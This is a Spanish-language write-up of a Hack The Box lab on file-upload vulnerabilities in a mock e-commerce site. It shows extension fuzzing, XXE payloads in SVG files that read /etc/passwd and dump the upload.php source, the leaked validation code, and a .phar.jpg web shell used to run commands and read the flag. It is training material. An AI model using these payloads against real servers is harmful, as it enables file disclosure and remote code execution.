--- 
title: "Laboratorio de File Upload"  
date: 2025-09-07
tags: [hackthebox, File Upload]
categories: ["Hack the Box", "File Upload"]
summary: "Durante el laboratorio se testearion los foltros de subida de archivos en la aplicación de e-commerce se identificaron múltiples vulnerabilidades que permitieron llegar hasta la ejecución remota de código (RCE) en el servidor."
draft: false 

---
![](../../../../../images/Miniaturas/file_upload.png)
#### Enunciado
Se le ha contratado para realizar una prueba de penetración en la aplicación web de comercio electrónico de una empresa. La aplicación web se encuentra en sus primeras etapas, por lo que solo probará los formularios de carga de archivos que encuentre.

Intente utilizar lo que aprendió en este módulo para comprender cómo funciona el formulario de carga y cómo omitir varias validaciones existentes (si las hay) para obtener la ejecución remota de código en el servidor back-end.

---

**Intente explotar el formulario de carga para leer la bandera que se encuentra en el directorio raíz "/".**
Accedemos a la página web que nos ponen.
![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-1.png)
Donde vemos que en la pestaña de **Contact Us** 
![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-2.png)
Vemos el campo de subida que debemos testear. Vemos el código donde se está validando la subida del archivo y es bastante similar al que nos hemos encontrado en el modulo.
![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-3.png)
Con `Burpsuite` fuzzeamos las extensiones para ver si podemos saltar los filtros de la aplicación.
![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-4.png)
Al fuzzear vemos que la mayoría de las extensiones .php estan bloqueadas sin embargo, las extensiones `.pht` y `.phar` al parecer no están en la `blacklist` que está validando los tipos sin embargo, se ve que no están en la whitelist dado que no es jpg, png o jpeg. Recordamos que estamos en un campo donde debemos subir imágenes.
Entonces con estas 2 extensiones vamos a intentar combinarlas con las extensiones válidas a ver si podemos pasar los filtros.
Luego de haber intentado en repetidas ocasiones la subida de archivos aplicamos uno de los conceptos que nos explicaron al final del modulo y es `XXE` en archivo `SVG`.
1. Primero lo que hice fue subir un archivo `.jpg` e interceptar la solicitud con `Burpsuite`.
2. Luego le modifique la extensión a `.svg.jpg`, me respondió bien.
![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-5.png)
3. Cambiamos el contenido para inyectar el `XXE`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-6.png)
4. Que sucede como vemos que podemos leer archivos necesitamos saber donde se suben nuestras imágenes, para poder consumir esos recursos cuando se suban al servidor. Vemos que le estamos haciendo `POST`  a `/contact/upload.php`. Vamos a revisar el contenido de `upload.php`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```
![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-7.png)
Copiamos el contenido en base64 en un decodificador online mismo y revisamos. Y tenemos esto:

```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```
Vemos que nos muestran el directorio de subida de archivos, renombran los archivos antes de almacenarlos y vemos las expresiones regulares que no nos permitían subir ciertos tipos de archivos.
Luego de subir fotos y entender el nombre que le ponen para almacenar los archivos en el servidor que es siguiente formato:
`YYMMDD_nombrearchivo.ext`
Ejemplo:
`250907_shell.phar.jpg`
Que hice yo subí una imagen desde el formulario y la vi accediendo a la url
Accedemos a la ruta:
`http://IP:Puerto/contact/user_feedback_submissions/250907_img.jpg`
Luego le cambié la extensión en local y volvi a subirla:
`http://IP:Puerto/contact/user_feedback_submissions/250907_imp.phar.jpg`
También me dejo subirla.
Luego lo que hice fue editar la foto introduciendo el comando de php para obtener una shell cuando consuma la foto. La subí nuevamente.
![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-8.png)

Accedemos a la url:
`http://IP:Puerto/contact/user_feedback_submissions/250907_img.phar.jpg?cmd=id`
![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-9.png)

Y vemos como nos ejecuta el comando a nivel de sistema.
Ya teniendo capacidad de ejecutar comandos en el servidor buscamos la flag.
`http://IP:Puerto/contact/user_feedback_submissions/250907_img.phar.jpg?cmd=ls /`
`http://IP:Puerto/contact/user_feedback_submissions/250907_img.phar.jpg?cmd=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`


![](../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-10.png)






Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.